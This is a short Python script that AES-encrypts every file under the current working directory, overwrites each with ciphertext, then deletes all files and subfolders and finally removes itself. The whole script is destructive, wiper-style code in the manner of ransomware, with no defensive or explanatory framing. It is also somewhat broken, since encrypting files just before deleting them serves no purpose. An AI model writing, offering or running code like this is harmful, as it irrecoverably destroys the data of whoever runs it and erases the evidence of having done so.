import os
import shutil
import random
import string
from Crypto.Cipher import AES

# Get the encryption key from the user
key = input("Enter encryption key: ")

# Generate random initialization vector
iv = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# Create the cipher object
cipher = AES.new(key.encode(), AES.MODE_CBC, iv.encode())

# Recursively delete files in the current directory and encrypt the data
def delete_files(dir_path):
    for filename in os.listdir(dir_path):
        file_path = os.path.join(dir_path, filename)
        if os.path.isfile(file_path):
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            # Pad the plaintext to be a multiple of 16 bytes
            plaintext += b'\0' * (AES.block_size - len(plaintext) % AES.block_size)
            # Encrypt the plaintext
            ciphertext = cipher.encrypt(plaintext)
            # Overwrite the file with encrypted data
            with open(file_path, 'wb') as f:
                f.write(ciphertext)
            # Delete the file
            os.remove(file_path)
        elif os.path.isdir(file_path):
            delete_files(file_path)
            os.rmdir(file_path)

# Call the delete_files function with the current working directory
delete_files(os.getcwd())

# Delete the script file itself
os.remove(__file__)
